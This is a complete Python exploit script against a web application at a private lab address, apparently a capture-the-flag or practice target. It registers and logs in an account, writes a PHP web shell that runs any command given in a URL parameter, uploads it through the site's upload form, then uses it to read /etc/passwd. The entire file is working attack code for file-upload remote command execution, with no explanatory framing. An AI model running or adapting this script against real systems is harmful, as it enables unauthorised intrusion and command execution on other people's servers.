import requests

# URLs
register_url = 'http://192.168.56.104:8015/music-copyright/Sound_of_music.html'
login_url = 'http://192.168.56.104:8015/cgi-bin/login.php'
upload_url = 'http://192.168.56.104:8015/music-copyright/cgi-bin/upload.php'
shell_url = 'http://192.168.56.104:8015/music-copyright/cgi-bin/uploads/test.php'

# Registration data
register_data = {
    'First': 'test',
    'Last': 'user',
    'Email': 'test@example.com',
    'Password': 'password'
}

# Create a session to persist cookies
session = requests.Session()

# Step 1: Register the account
response = session.post(register_url, data=register_data)
print("Registration response:", response.text)

# Step 2: Login data
login_data = {
    'email': 'test@example.com',
    'password': 'password'
}

# Step 2: Login with the created account
response = session.post(login_url, data=login_data)
print("Login response:", response.text)

# Step 3: Check if login was successful
if 'Welcome' in response.text or response.status_code == 200:
    print("Login successful")

    # Prepare the PHP shell file
    with open('test.php', 'w') as f:
        f.write("<?php system($_GET['cmd']); ?>")

    # Step 3: Upload the file
    files = {'file': ('test.php', open('test.php', 'rb'))}
    response = session.post(upload_url, files=files)
    print("File upload response:", response.text)

    # Step 4: Try accessing the uploaded shell
    response = session.get(shell_url)
    if response.status_code == 200:
        print(f"Shell found at {shell_url}")
        # Execute a command to read /etc/passwd
        payload = {'cmd': 'cat /etc/passwd'}
        response = session.get(shell_url, params=payload)
        print(response.text)
    else:
        print("Shell not found at the expected location.")
else:
    print("Login failed")
